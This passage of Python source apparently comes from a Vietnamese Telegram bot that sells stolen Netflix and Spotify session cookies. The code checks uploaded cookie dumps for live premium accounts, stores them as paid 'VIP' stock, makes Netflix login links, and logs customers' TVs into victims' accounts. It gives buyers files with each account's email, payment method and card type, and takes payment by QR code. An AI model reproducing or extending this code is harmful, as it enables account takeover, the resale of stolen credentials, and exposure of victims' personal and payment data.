            active_tasks[chat_id] = True
            await query.edit_message_text(f"{banner_result_fail()}\n  ⏹ Đã dừng tác vụ.\n\n  {DIVIDER_THIN}\n  {FOOTER}", parse_mode='Markdown')
        else: await query.answer("Không có tác vụ nào đang chạy")

    elif query.data == 'admin_panel':
        if user.id != ADMIN_ID: return
        total, active, tokens, avail, used = get_stats()
        text = f"👑 *ADMIN DASHBOARD*\n━━━━━━━━━━━━━━━━━━\n👥 Tổng User: {total}\n🟢 Active hôm nay: {active}\n🔗 Tổng Link tạo: {tokens}\n🎁 Kho Cookie: {avail} (đã phát: {used})\n━━━━━━━━━━━━━━━━━━\n👉 Chọn tính năng quản lý bên dưới:"
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=kb_admin())

    elif query.data == 'back_main':
        bal, cred = get_user_economy(user.id)
        await query.edit_message_text(banner_main(user.id, name, bal, cred), parse_mode='Markdown', reply_markup=kb_main())
        context.user_data['awaiting'] = None

    elif query.data == 'proxy_set':
        text = f"{LOGO}  ›  *Thiết lập Proxy*\n{DIVIDER}\n\n📝 Gửi proxy theo định dạng:\n\n  • `IP:Port`\n  • `IP:Port:User:Pass`\n\n  {DIVIDER_THIN}\n  {FOOTER}"
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=kb_back())
        context.user_data['awaiting'] = 'add_proxy'

    elif query.data == 'proxy_toggle':
        if proxy_manager.proxy_enabled:
            proxy_manager.disable()
            await query.answer('Proxy da tat')
        else:
            if proxy_manager.proxy:
                proxy_manager.enable()
                await query.answer('Proxy da bat')
            else:
                await query.answer('Chua cai dat proxy')
                return
        text = f"{LOGO}  ›  *Cài đặt Proxy*\n{DIVIDER}\n\n  {proxy_manager.get_status_icon()}  Trạng thái:  {proxy_manager.get_status_text()}\n\n{DIVIDER_THIN}\n{FOOTER}"
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=kb_proxy())

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_user_status(update, context): return

    try:
        await update.message.delete()
    except Exception:
        pass

    text = update.message.text or update.message.caption or ''
    awaiting = context.user_data.get('awaiting')
    user_id = update.effective_user.id if update.effective_user else 0

    def send_no_action_reply():
        return context.bot.send_message(chat_id=update.effective_chat.id, text=f"{banner_result_fail()}\n  Hiện tại bot đang chờ thao tác.\n  Hãy mở menu và chọn chức năng phù hợp.\n\n  {DIVIDER_THIN}\n  {FOOTER}", parse_mode='Markdown', reply_markup=kb_main())

    if not awaiting:
        await send_no_action_reply()
        return

    if awaiting == 'tv_code':
        tv_code = text.strip().replace(" ", "").replace("-", "")
        if not (len(tv_code) == 8 and tv_code.isdigit()):
            await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Mã TV phải gồm đúng 8 chữ số (ví dụ: 12345678).")
            return

        status_msg = await context.bot.send_message(chat_id=update.effective_chat.id, text="⏳ *Đang kết nối vào hệ thống để đăng nhập TV...*", parse_mode='Markdown')

        error_msg = "Kho Cookie Premium đang trống"
        error_reason = "cookie_unavailable"
        held_cookie_ids = []
        for _attempt in range(3):
            cookies = pop_premium_cookies(1, user_id)
            if not cookies:
                break

            c_id, c_data = cookies[0]
            held_cookie_ids.append(c_id)
            c_dict_list = checker.extract_cookies_from_text(c_data)
            if not c_dict_list:
                error_msg = "Cookie trong kho sai định dạng"
                error_reason = "cookie_format"
                continue

            success, error_reason, error_msg, account_info = await asyncio.to_thread(
                process_tv_login, c_dict_list[0], tv_code
            )
            dead_cookie = error_reason in ("cookie_expired", "cookie_format")

            if success:
                for held_id in held_cookie_ids:
                    return_premium_cookie(held_id)
                card = format_account_card(account_info, "Đăng nhập trực tiếp trên TV thành công!")
                await status_msg.edit_text(
                    f"🎉 *ĐĂNG NHẬP TV THÀNH CÔNG!*\n\nTV của bạn đã được kết nối với tài khoản dưới đây:\n\n{card}",
                    parse_mode='Markdown',
                    reply_markup=kb_done_with_report(),
                )
                context.user_data['awaiting'] = None
                return

            if dead_cookie:
                continue

            break

        for held_id in held_cookie_ids:
            return_premium_cookie(held_id)
        await status_msg.edit_text(
            f"❌ *ĐĂNG NHẬP TV THẤT BẠI!*\n\nMã lỗi: `{error_reason}`\nLý do: `{error_msg}`\n\nHãy kiểm tra lại trạng thái Netflix hoặc thử lại sau.",
            parse_mode='Markdown',
            reply_markup=kb_main(),
        )
        context.user_data['awaiting'] = None
        return

    if awaiting and awaiting.startswith('admin_send_reply_'):
        if user_id != ADMIN_ID: return
        target_uid = awaiting.split('_')[3]
        try:
            await context.bot.send_message(chat_id=target_uid, text=f"💬 *Tin nhắn từ Admin:*\n\n{text}", parse_mode='Markdown')
            await context.bot.send_message(chat_id=update.effective_chat.id, text="✅ Đã gửi phản hồi thành công!")
        except Exception as e:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ Không gửi được tin nhắn cho khách: {e}")
        context.user_data['awaiting'] = None
        return

    if awaiting == 'admin_lookup_bill':
        if user_id != ADMIN_ID: return
        try:
            bill_id = int(text.replace('#', '').strip())
            bill = get_purchase_by_id(bill_id)
            if bill:
                b_id, b_uid, b_plan, b_price, b_date = bill
                msg_txt = (
                    f"🧾 *CHI TIẾT HÓA ĐƠN #{b_id}*\n\n"
                    f"👤 ID Người mua: `{b_uid}`\n"
                    f"📦 Gói đã mua: `{b_plan}`\n"
                    f"💰 Số tiền: `{b_price:,.0f}đ`\n"
                    f"🕒 Thời gian: `{b_date}`"
                )
                admin_markup = InlineKeyboardMarkup([[InlineKeyboardButton("💬 Trả lời Khách này", callback_data=f"admin_reply_{b_uid}")]])
                await context.bot.send_message(chat_id=update.effective_chat.id, text=msg_txt, parse_mode='Markdown', reply_markup=admin_markup)
            else:
                await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Không tìm thấy hóa đơn này trên hệ thống.", reply_markup=kb_admin())
        except ValueError:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ ID hóa đơn không hợp lệ, vui lòng nhập số.", reply_markup=kb_admin())
        context.user_data['awaiting'] = None
        return

    if awaiting == 'admin_add_discount' and user_id == ADMIN_ID:
        args = text.split()
        if len(args) == 3:
            try:
                code, amount, uses = args[0], int(args[1]), int(args[2])
                add_discount_code(code, amount, uses)
                await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ Đã tạo mã `{code}` trị giá {amount:,.0f}đ ({uses} lượt).", parse_mode='Markdown')
            except ValueError:
                await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Lỗi: Số tiền hoặc lượt dùng không hợp lệ.")
        else: await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Sai cú pháp. Ví dụ: `SALE50K 50000 10`", parse_mode='Markdown')
        context.user_data['awaiting'] = None
        return

    if awaiting == 'admin_ban_user' and user_id == ADMIN_ID:
        try:
            uid = int(text.strip())
            ban_user(uid)
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ Đã khóa tài khoản ID `{uid}`.", parse_mode='Markdown')
            try: await context.bot.send_message(chat_id=uid, text="🚫 *TÀI KHOẢN ĐÃ BỊ KHÓA*\n\nTài khoản của bạn đã bị Admin khóa do vi phạm chính sách.", parse_mode='Markdown')
            except: pass
        except ValueError: await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ ID không hợp lệ.")
        context.user_data['awaiting'] = None
        return

    if awaiting == 'admin_unban_user' and user_id == ADMIN_ID:
        try:
            uid = int(text.strip())
            unban_user(uid)
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ Đã mở khóa tài khoản ID `{uid}`.", parse_mode='Markdown')
        except ValueError: await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ ID không hợp lệ.")
        context.user_data['awaiting'] = None
        return

    if awaiting == 'report_error':
        admin_text = f"⚠️ *BÁO CÁO LỖI TỪ NGƯỜI DÙNG*\n\n👤 User ID: `{user_id}`\n📝 Nội dung: {text if text else '(Có đính kèm tệp/ảnh)'}"
        admin_markup = InlineKeyboardMarkup([[InlineKeyboardButton("💬 Trả lời Khách", callback_data=f"admin_reply_{user_id}")]])
        try:
            if update.message.photo: await context.bot.send_photo(chat_id=ADMIN_ID, photo=update.message.photo[-1].file_id, caption=admin_text, parse_mode='Markdown', reply_markup=admin_markup)
            else: await context.bot.send_message(chat_id=ADMIN_ID, text=admin_text, parse_mode='Markdown', reply_markup=admin_markup)
            await context.bot.send_message(chat_id=update.effective_chat.id, text="✅ Cảm ơn bạn! Báo cáo của bạn đã được gửi đến Admin.", reply_markup=kb_main())
        except Exception: await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Lỗi khi gửi báo cáo.", reply_markup=kb_main())
        context.user_data['awaiting'] = None
        return

    if awaiting == 'deposit_enter_amount':
        try:
            amount = int(text.replace(',', '').replace('.', '').strip())
            if amount <= 0: raise ValueError
        except ValueError:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Số tiền không hợp lệ. Vui lòng nhập lại số tiền (VD: `50000`).")
            return
        url = f"https://img.vietqr.io/image/MB-17363999999999-compact2.png?amount={amount}&addInfo=NAP%20{user_id}&accountName=BUI%20MINH%20NHUT"
        caption = f"💸 *QR NẠP TIỀN TỰ ĐỘNG*\n\n💰 Số tiền: *{amount:,.0f}đ*\n📝 Nội dung: `NAP {user_id}`\n\nVui lòng quét mã QR để chuyển khoản. Sau đó bấm nút bên dưới."
        markup = InlineKeyboardMarkup([[InlineKeyboardButton("✅ Đã Chuyển Khoản", callback_data=f"deposit_submit_bill_{amount}")], [InlineKeyboardButton("🏡 Hủy Bỏ", callback_data="back_main")]])
        await context.bot.send_photo(chat_id=update.effective_chat.id, photo=url, caption=caption, parse_mode='Markdown', reply_markup=markup)
        context.user_data['awaiting'] = None
        return

    if awaiting and awaiting.startswith('deposit_bill_'):
        amount = int(awaiting.split('_')[2])
        tx_id = create_transaction(user_id, amount)
        admin_text = f"🔔 *YÊU CẦU NẠP TIỀN*\n\n👤 User ID: `{user_id}`\n💰 Số tiền: *{amount:,.0f}đ*\nMã GD: `#{tx_id}`\n\nKèm hình ảnh bill của khách hàng bên dưới."
        admin_buttons = [[InlineKeyboardButton("✅ Duyệt Nạp", callback_data=f"admin_approve_tx_{tx_id}")], [InlineKeyboardButton("🚫 Từ Chối", callback_data=f"admin_reject_tx_{tx_id}")], [InlineKeyboardButton("💬 Trả lời Khách", callback_data=f"admin_reply_{user_id}")]]
        try:
            if update.message.photo: await context.bot.send_photo(chat_id=ADMIN_ID, photo=update.message.photo[-1].file_id, caption=admin_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(admin_buttons))
            else: await context.bot.send_message(chat_id=ADMIN_ID, text=admin_text + "\n*(Khách không gửi ảnh bill)*", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(admin_buttons))
        except: pass
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ *Gửi yêu cầu thành công!*\n\nSố tiền yêu cầu: *{amount:,.0f}đ*\nMã giao dịch: `#{tx_id}`\n\nVui lòng chờ Admin kiểm tra và duyệt.", parse_mode='Markdown', reply_markup=kb_main())
        context.user_data['awaiting'] = None
        return

    if awaiting == 'admin_setplan' and user_id == ADMIN_ID:
        args = text.split()
        if len(args) == 2:
            if set_plan(args[0], args[1].upper()): await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ Đã set user `{args[0]}` lên gói `{args[1].upper()}`", parse_mode='Markdown')
            else: await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Gói cước không tồn tại!")
        else: await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Sai cú pháp. Ví dụ: `123456 VIP`", parse_mode='Markdown')
        context.user_data['awaiting'] = None
        return

    if awaiting == 'admin_addplan' and user_id == ADMIN_ID:
        args = text.split()
        if len(args) == 3:
            try:
                add_plan(args[0].upper(), int(args[1]), int(args[2]))
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"✅ Đã tạo cấu hình giới hạn gói `{args[0].upper()}` thành công!\n\n"
                    f"💡 *Lưu ý:* Để gói này hiển thị lên kệ hàng cho khách mua, bạn vui lòng sử dụng chức năng **🛒 Thêm Gói CH** nhé!",
                    parse_mode='Markdown', reply_markup=kb_admin()
                )
            except ValueError: await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Số lượt phải là một con số hợp lệ.", reply_markup=kb_admin())
        else: await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Sai cú pháp. Ví dụ: `PRO 999 5`", parse_mode='Markdown', reply_markup=kb_admin())
        context.user_data['awaiting'] = None
        return

    if awaiting == 'admin_addstore' and user_id == ADMIN_ID:
        args = text.split()
        if len(args) == 3:
            try:
                plan_name, price, credits = args[0].upper(), int(args[1]), int(args[2])
                add_store_item(plan_name, price, credits)
                await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ Đã đưa gói `{plan_name}` lên kệ hàng!\n💰 Giá bán: {price:,.0f}đ\n🎫 Lượt rút cookie VIP: {credits}", parse_mode='Markdown', reply_markup=kb_admin())
            except ValueError: await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Giá và lượt phải là số hợp lệ.", reply_markup=kb_admin())
        else: await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Sai cú pháp. Ví dụ: `VIP1 20000 10`", parse_mode='Markdown', reply_markup=kb_admin())
        context.user_data['awaiting'] = None
        return

    if awaiting == 'admin_broadcast' and user_id == ADMIN_ID:
        conn = get_connection()
        c = conn.cursor()
        c.execute("SELECT user_id FROM users")
        users = c.fetchall()
        conn.close()
        success = 0
        status_broadcast = await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Đang gửi tới {len(users)} users...")
        for u in users:
            try:
                await context.bot.send_message(chat_id=u[0], text=f"📢 *THÔNG BÁO TỪ ADMIN*\n\n{text}", parse_mode='Markdown')
                success += 1
            except: pass
        await status_broadcast.edit_text(f"✅ Đã gửi thành công đến {success} users.")
        context.user_data['awaiting'] = None
        return

    if awaiting == 'extract_vip_count':
        try:
            count = int(text.strip())
            if count <= 0: raise ValueError
        except ValueError:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Vui lòng nhập một số hợp lệ lớn hơn 0.")
            return
        bal, cred = get_user_economy(user_id)
        if cred < count and user_id != ADMIN_ID:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ Bạn chỉ còn {cred} lượt rút VIP. Vui lòng nạp thêm hoặc giảm số lượng.")
            context.user_data['awaiting'] = None
            return
        avail = get_premium_cookie_count()
        if avail < count:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ Kho hiện tại chỉ còn {avail} cookie. Vui lòng rút số lượng ít hơn.")
            context.user_data['awaiting'] = None
            return
        status_msg = await context.bot.send_message(chat_id=update.effective_chat.id, text=f"⏳ Đang tiến hành rút và kiểm tra {count} cookie từ kho...")
        success_results, attempts, max_attempts = [], 0, count * 3
        while len(success_results) < count and attempts < max_attempts:
            cookies = pop_premium_cookies(1, user_id)
            if not cookies: break
            c_id, c_data = cookies[0]
            c_dict_list = checker.extract_cookies_from_text(c_data)
            if not c_dict_list:
                delete_premium_cookie(c_id)
                continue
            c_dict = c_dict_list[0]
            success, token, error, account = checker.check_cookie(c_dict)
            attempts += 1
            if success and token and account.get('membership_status') == 'CURRENT_MEMBER':
                success_results.append({'cookies': c_dict, 'token': token, 'link': checker.format_nftoken_link(token), 'account': account})
                deduct_credits(user_id, 1)
            else:
                if not success or not token or account.get('membership_status') in ('FORMER_MEMBER', 'ON HOLD'):
                    delete_premium_cookie(c_id)
                else:
                    return_premium_cookie(c_id)

        if not success_results: await status_msg.edit_text("❌ Rất tiếc, kho cookie tạm thời bị lỗi hoặc hết cookie sống. Số lượt rút của bạn vẫn được giữ nguyên.")
        else:
            actual_count = len(success_results)
            content_lines = [f"════════════════════════════════════════\n BÁO CÁO RÚT COOKIE VIP\n Thời gian: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n Đã rút thành công: {actual_count}/{count} cookie\n════════════════════════════════════════\n"]
            for i, res in enumerate(success_results, 1):
                acc = res['account']
                content_lines.extend([f"[{i}] TÀI KHOẢN", f"Email: {acc.get('email', 'N/A')}", f"Gói cước: {acc.get('plan', 'N/A')} - {acc.get('country', 'N/A')}", f"Thanh toán: {acc.get('payment_method', 'N/A')} - {acc.get('cc_type', 'N/A')}", f"NFToken: {res['token']}", f"Login Link: {res['link']}", f"\nNetscape Cookie:\n{checker.build_netscape_format(res['cookies'])}", f"\n{'='*40}\n"])
            fname = f"VIP_Cookies_{actual_count}_{datetime.now().strftime('%H%M%S')}.txt"
            await context.bot.send_document(chat_id=update.effective_chat.id, document=io.BytesIO("\n".join(content_lines).encode('utf-8')), filename=fname, caption=f"🎉 Đã rút thành công {actual_count} cookie VIP.\nĐã trừ {actual_count} lượt rút từ tài khoản của bạn.")
            await status_msg.delete()
        context.user_data['awaiting'] = None
        return

    if awaiting == 'cookie':
        status_msg = await context.bot.send_message(chat_id=update.effective_chat.id, text=f"⏳ *Đang phân tích cookie...*", parse_mode='Markdown')
        cookies_list = checker.extract_cookies_from_text(text)
        if not cookies_list:
            await status_msg.edit_text(f"{banner_result_fail()}\n  Không tìm thấy *NetflixId*\n  trong dữ liệu bạn gửi.\n\n  Hãy kiểm tra lại cookie.\n\n  {DIVIDER_THIN}\n  {FOOTER}", parse_mode='Markdown', reply_markup=kb_done())
            context.user_data['awaiting'] = None
            return
        cookie_dict = cookies_list[0]
        tokens_used, tokens_max, cookies_used, cookies_max, plan_name = get_user_quota(user_id)
        if tokens_used >= tokens_max:
            await status_msg.edit_text(f"❌ *Bạn đã hết lượt tạo link hôm nay ({tokens_max}/{tokens_max})*.\nHãy liên hệ Admin để nâng cấp gói cước hoặc quay lại vào ngày mai nhé!", parse_mode='Markdown', reply_markup=kb_done())
            context.user_data['awaiting'] = None
            return
        await status_msg.edit_text(f"⏳ *Đang kiểm tra...*\n\n  Thử kết nối tới Netflix API...\n\n  {DIVIDER_THIN}\n  {FOOTER}", parse_mode='Markdown', reply_markup=kb_cancel())
        chat_id = update.effective_chat.id
        active_tasks[chat_id] = False
        success, token, error, account = checker.check_cookie(cookie_dict)

        if success and token and account.get('membership_status') == 'CURRENT_MEMBER':
            add_token_usage(user_id, 1)
            update_stats(user_id, total=1, success=1)
            if active_tasks.get(chat_id, False):
                active_tasks.pop(chat_id, None)
                context.user_data['awaiting'] = None
                return
            active_tasks.pop(chat_id, None)

            link = checker.format_nftoken_link(token)
            await status_msg.edit_text(format_account_card(account, link), parse_mode='Markdown', disable_web_page_preview=True)
            email, plan_val, country_val = account.get('email', 'NoEmail'), account.get('plan', 'NoPlan'), account.get('country', 'XX')
            _sanitize = re.compile(r'[^\w\-_]')
            _e = _sanitize.sub('', email.split('@')[0])
            _p = _sanitize.sub('', plan_val.replace(' ', '_'))
            _c = _sanitize.sub('', country_val)
            filename = f"NF_{_e}_{_p}_{_c}.txt"
            file_content = f"# ══════════════════════════════════════\n#  NETFLIX COOKIE + NFTOKEN\n#  Generated by {BOT_NAME} v{BOT_VERSION}\n#  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n# ══════════════════════════════════════\n#\n# Email:      {account.get('email', 'N/A')}\n# Plan:       {account.get('plan', 'N/A')}\n# Country:    {account.get('country', 'N/A')}\n# Payment:    {account.get('payment_method', 'N/A')}\n# CC Type:    {account.get('cc_type', 'N/A')}\n# Streams:    {account.get('max_streams', 'N/A')}\n# Quality:    {account.get('video_quality', 'N/A')}\n# Status:     {account.get('membership_status', 'N/A')}\n# Extra:      {account.get('extra_member_slots', 'N/A')}\n#\n# NFToken:    {token}\n# Login:      {link}\n#\n# ══════════════════════════════════════\n\n{checker.build_netscape_format(cookie_dict)}"
            await context.bot.send_document(chat_id=update.effective_chat.id, document=io.BytesIO(file_content.encode()), filename=filename, caption=f"📄 {filename}")
        else:
            update_stats(user_id, total=1, success=0)
            if error: error_str = error
            else: error_str = "Tài khoản bị Hold thanh toán hoặc Hết hạn"
            await status_msg.edit_text(f"{banner_result_fail()}\n  *Lý do:*  `{error_str}`\n\n  💡 Cookie có thể đã hết hạn\n  hoặc tài khoản bị khóa.\n\n  {DIVIDER_THIN}\n  {FOOTER}", parse_mode='Markdown')

        context.user_data['awaiting'] = None
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⬇️", reply_markup=kb_done())

    if awaiting == 'add_proxy':
        if proxy_manager.set_proxy(text):
            proxy_manager.enable()
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ *Proxy đã thiết lập & bật*\n\n  🌐 `{text}`\n\n  {DIVIDER_THIN}\n  {FOOTER}", parse_mode='Markdown', reply_markup=kb_proxy())
        else: await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ *Sai định dạng*\n\n  Dùng: `IP:Port` hoặc\n  `IP:Port:User:Pass`\n\n  {DIVIDER_THIN}\n  {FOOTER}", parse_mode='Markdown', reply_markup=kb_proxy())
        context.user_data['awaiting'] = None

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_user_status(update, context): return

    try: await update.message.delete()
    except: pass

    current_awaiting = context.user_data.get('awaiting')
    user_id = update.effective_user.id if update.effective_user else 0

    if current_awaiting not in ['admin_upload_cookie_vip', 'admin_upload_cookie_free', 'admin_upload_cookie_vip_fast', 'admin_upload_cookie_spotify']:
        if user_id == ADMIN_ID and update.message.document:
            fname = update.message.document.file_name or ''
            if fname.endswith('.txt') or fname.endswith('.zip') or fname.endswith('.rar'): current_awaiting = 'admin_upload_cookie_vip'
            else: return
        else: return

    file = await update.message.document.get_file()

    if file.file_size > MAX_FILE_SIZE:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ File quá lớn. Tối đa *{MAX_FILE_SIZE // 1024 // 1024}MB*", parse_mode='Markdown', reply_markup=kb_done())
        return

    file_content_buf = io.BytesIO()
    await file.download_to_memory(file_content_buf)
    file_content_buf.seek(0)
    filename = update.message.document.file_name
    all_cookies = []

    status_msg = await context.bot.send_message(chat_id=update.effective_chat.id, text=f"⏳ *Đang đọc file...*\n\n  {FOOTER}", parse_mode='Markdown', reply_markup=kb_cancel())
    chat_id = update.effective_chat.id
    active_tasks[chat_id] = False

    try:
        if current_awaiting == 'admin_upload_cookie_spotify' and user_id == ADMIN_ID:
            if not (filename.endswith('.zip') or filename.endswith('.rar')):
                await status_msg.edit_text("❌ Vui lòng gửi định dạng file `.zip` hoặc `.rar`.", reply_markup=kb_admin())
                return

            await status_msg.edit_text("🎧 *Đang giải nén file...*", parse_mode='Markdown')

            extracted_accounts = []
            if filename.endswith('.zip'):
                with zipfile.ZipFile(file_content_buf) as zip_file:
                    validate_zip_archive(zip_file)
                    for txt_file in [f for f in zip_file.namelist() if f.endswith('.txt')]:
                        with zip_file.open(txt_file) as f:
                            text_content = f.read().decode('utf-8', errors='ignore')
                            result = process_spotify_cookie_text(text_content)
                            if result:
                                extracted_accounts.append(result)
            elif filename.endswith('.rar'):
                with rarfile.RarFile(file_content_buf) as rar_file:
                    validate_rar_archive(rar_file)
                    for txt_file in [f for f in rar_file.namelist() if f.endswith('.txt')]:
                        with rar_file.open(txt_file) as f:
                            text_content = f.read().decode('utf-8', errors='ignore')
                            result = process_spotify_cookie_text(text_content)
                            if result:
                                extracted_accounts.append(result)

            total_len = len(extracted_accounts)
            if total_len == 0:
                await status_msg.edit_text("❌ Không tìm thấy cookie Spotify hợp lệ trong file ZIP.", reply_markup=kb_admin())
                return
            if total_len > MAX_BATCH_COOKIES:
                await status_msg.edit_text(
                    f"❌ File có {total_len} cookie; giới hạn mỗi lần là "
                    f"{MAX_BATCH_COOKIES} để tránh treo bot.",
                    reply_markup=kb_admin(),
                )
                return

            await status_msg.edit_text(f"🔍 *Đang kiểm tra LIVE {total_len} acc Spotify...*\n(Đa luồng 15 workers)", parse_mode='Markdown')

            live_premium = 0
            live_family = 0
            dead_count = 0
            processed_count = 0
            valid_spotify_to_insert = []

            queue = asyncio.Queue()
            for acc in extracted_accounts:
                queue.put_nowait(acc)

            async def spotify_worker():
                nonlocal live_premium, live_family, dead_count, processed_count
                while True:
                    try: acc = queue.get_nowait()
                    except asyncio.QueueEmpty: break

                    if active_tasks.get(chat_id, False):
                        queue.task_done()
                        continue

                    try:
                        json_cookies = json.loads(acc['json_data'])
                        is_live, actual_plan = await check_spotify_cookie_live(json_cookies)

                        if is_live and actual_plan:
                            valid_spotify_to_insert.append((acc['json_data'], acc['email'], acc['country'], actual_plan))
                            if actual_plan == 'PREMIUM': live_premium += 1
                            else: live_family += 1
                        else:
                            dead_count += 1
                    except Exception:
                        dead_count += 1

                    processed_count += 1
                    queue.task_done()

            workers = [asyncio.create_task(spotify_worker()) for _ in range(15)]
            last_update = time.time()

            while not queue.empty() or processed_count < total_len:
                await asyncio.sleep(1)
                if active_tasks.get(chat_id, False): break
                if time.time() - last_update >= 2:
                    try:
                        await status_msg.edit_text(
                            f"🔍 *Đang Live Check Spotify...*\n\n"
                            f"  📋 Tiến độ: *{processed_count}* / *{total_len}* ({round(processed_count/total_len*100)}%)\n"
                            f"  🎵 Premium Sống: *{live_premium}*\n"
                            f"  👨‍👩‍👧‍👦 Chủ Family Sống: *{live_family}*\n"
                            f"  ❌ Lỗi / Free / Hết Hạn: *{dead_count}*",
                            parse_mode='Markdown', reply_markup=kb_cancel()
                        )
                    except: pass
                    last_update = time.time()

            try: await asyncio.wait_for(queue.join(), timeout=30)
            except asyncio.TimeoutError: pass
            for w in workers: w.cancel()

            if valid_spotify_to_insert:
                try:
                    conn = get_connection()
                    c = conn.cursor()
                    c.executemany("INSERT INTO spotify_cookies (json_data, email, country, plan_type) VALUES (?, ?, ?, ?)", valid_spotify_to_insert)
                    conn.commit()
                    conn.close()
                except Exception as e:
                    logger.error(f"Spotify Batch Insert Error: {e}")

            active_tasks.pop(chat_id, None)

            total_added = live_premium + live_family
            msg = (
                f"✅ *LỌC & NẠP SPOTIFY HOÀN TẤT*\n\n"
                f"📦 Tổng file gửi lên: *{total_len}*\n"
                f"✅ Cookie sống (Đã nạp kho): *{total_added}*\n"
                f"   ├ 🎵 Premium Thường: *{live_premium}*\n"
                f"   └ 👨‍👩‍👧‍👦 Chủ Family: *{live_family}*\n"
                f"❌ Lỗi / Bị giáng xuống Free: *{dead_count}*"
            )
            await status_msg.edit_text(msg, parse_mode='Markdown', reply_markup=kb_admin())
            context.user_data['awaiting'] = None
            return

        if filename.endswith('.zip'):
            with zipfile.ZipFile(file_content_buf) as zip_file:
                validate_zip_archive(zip_file)
                for txt_file in [f for f in zip_file.namelist() if f.endswith('.txt')]:
                    if active_tasks.get(chat_id, False):
                        await status_msg.edit_text(f"⏹ *Đã dừng*\n\n  {FOOTER}", parse_mode='Markdown')
                        active_tasks.pop(chat_id, None)
                        return
                    with zip_file.open(txt_file) as f:
                        all_cookies.extend(checker.extract_cookies_from_text(f.read().decode('utf-8', errors='ignore')))
        elif filename.endswith('.rar'):
            with rarfile.RarFile(file_content_buf) as rar_file:
                validate_rar_archive(rar_file)
                for txt_file in [f for f in rar_file.namelist() if f.endswith('.txt')]:
                    if active_tasks.get(chat_id, False):
                        await status_msg.edit_text(f"⏹ *Đã dừng*\n\n  {FOOTER}", parse_mode='Markdown')
                        active_tasks.pop(chat_id, None)
                        return
                    with rar_file.open(txt_file) as f:
                        all_cookies.extend(checker.extract_cookies_from_text(f.read().decode('utf-8', errors='ignore')))
        elif filename.endswith('.txt'): all_cookies = checker.extract_cookies_from_text(file_content_buf.read().decode('utf-8', errors='ignore'))
        else:
            await status_msg.edit_text(f"❌ Chỉ hỗ trợ `.txt`, `.zip` và `.rar`\n\n  {FOOTER}", parse_mode='Markdown', reply_markup=kb_done())
            return

        if not all_cookies:
            await status_msg.edit_text(f"❌ Không tìm thấy cookie hợp lệ.\n  Cần có *NetflixId* trong file.\n\n  {FOOTER}", parse_mode='Markdown', reply_markup=kb_done())
            return
        if len(all_cookies) > MAX_BATCH_COOKIES:
            await status_msg.edit_text(
                f"❌ Tìm thấy {len(all_cookies)} cookie; giới hạn mỗi lần là "
                f"{MAX_BATCH_COOKIES} để bot luôn phản hồi.",
                reply_markup=kb_done(),
            )
            return

        if current_awaiting == 'admin_upload_cookie_vip_fast' and user_id == ADMIN_ID:
            total_len = len(all_cookies)
            await status_msg.edit_text(f"⚡ *Đang nạp thẳng {total_len} cookie (Không qua bước check)...*", parse_mode='Markdown')

            fast_data_to_insert = [(checker.build_netscape_format(cookie_dict),) for cookie_dict in all_cookies]
            if fast_data_to_insert:
                try:
                    conn = get_connection()
                    c = conn.cursor()
                    c.executemany("INSERT INTO premium_cookies (data) VALUES (?)", fast_data_to_insert)
                    conn.commit()
                    conn.close()
                except Exception as e:
                    logger.error(f"Fast Insert Error: {e}")

            await status_msg.edit_text(f"✅ *NẠP NHANH THÀNH CÔNG*\n\n📦 Đã nạp *{total_len}* cookie trực tiếp vào kho VIP!", parse_mode='Markdown', reply_markup=kb_admin())
            context.user_data['awaiting'] = None
            active_tasks.pop(chat_id, None)
            return

        if current_awaiting in ['admin_upload_cookie_vip', 'admin_upload_cookie_free'] and user_id == ADMIN_ID:
            is_vip = (current_awaiting == 'admin_upload_cookie_vip')
            target_name = "VIP" if is_vip else "Free"
            total_len = len(all_cookies)

            await status_msg.edit_text(f"🔍 *Đang khởi tạo máy quét đa luồng...*\nTổng số: {total_len} cookie", parse_mode='Markdown')

            live_count = 0
            dead_count = 0
            processed_count = 0
            valid_cookies_to_insert = []

            queue = asyncio.Queue()
            for cookie_dict in all_cookies:
                queue.put_nowait(cookie_dict)

            async def admin_worker():
                nonlocal live_count, dead_count, processed_count
                while True:
                    try: cookie_dict = queue.get_nowait()
                    except asyncio.QueueEmpty: break

                    if active_tasks.get(chat_id, False):
                        queue.task_done()
